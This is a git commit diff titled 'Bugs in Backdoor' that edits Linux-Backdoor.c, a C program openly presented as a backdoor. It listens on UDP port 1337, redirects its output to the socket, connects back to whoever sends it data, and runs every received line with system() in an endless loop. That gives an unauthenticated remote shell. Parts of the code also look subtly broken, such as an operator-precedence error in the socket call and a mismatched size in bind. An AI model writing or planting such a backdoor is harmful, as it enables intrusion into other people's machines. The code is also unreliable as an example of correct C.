0386900d176c175597ad04445c05c8e4b90296a7
soup-tech <campbellssoup21@gmail.com>
2021-07-20 14:42:17 -0400

    Bugs in Backdoor

--- src/c++/Backdoor/Linux-Backdoor.c
+++ src/c++/Backdoor/Linux-Backdoor.c
@@ -6,6 +6,8 @@
 #include <ctype.h>
 #include <unistd.h>
 
+#define DP 1337 /* Default Port */
+
 void usg(char ** argv) {
 	printf("usage: %s [port]\n", * argv);
 }
@@ -27,15 +29,30 @@ int main(int argc, char ** argv) {
 		argc = atoi(*(++argv));
 	}
 
-	s.sin_port = htons(argc == 2 ? argc : 1337), s.sin_addr.s_addr = INADDR_ANY, s.sin_family = AF_INET;
-	if (argc = socket(AF_INET,SOCK_DGRAM,0) == -1) error("socket");
-
-	if (bind(argc, (struct sockaddr *) &s,sizeof(s)) == -1) error("bind");
+	s.sin_port = htons(argc == 2 ? argc : DP), s.sin_addr.s_addr = INADDR_ANY, s.sin_family = AF_INET;
+	if (argc = socket(AF_INET,SOCK_DGRAM,0) < 0) error("socket");
+	
+	if (bind(argc, & s,sizeof(u)) < 0) error("bind");
 
 	dup2(argc, 1);
 	dup2(argc, 2);
 
 	s.sin_port = sizeof(u);
 
+	if (recvfrom(argc, & b, 1024, 0, & u, (int *) & (s.sin_port)) <= 0) error("recvfrom");
 
+	if (connect(argc, & u, sizeof(u)) < 0) error("connect");
+	
+	do {
+		for (*argv = b, p = 0; **argv && ((*argv - b) < 512 || (p = *argv)); ( *argv) ++) {
+			if (p ||  **argv == '\r' || **argv == '\n') {
+				**argv = 0;
+				break;
+			}
+			if (p) continue;
+		}	
+		system(b);
+		recv(argc, & b, 1024, 0);
+	} while (1);
+	exit(0);	
 }
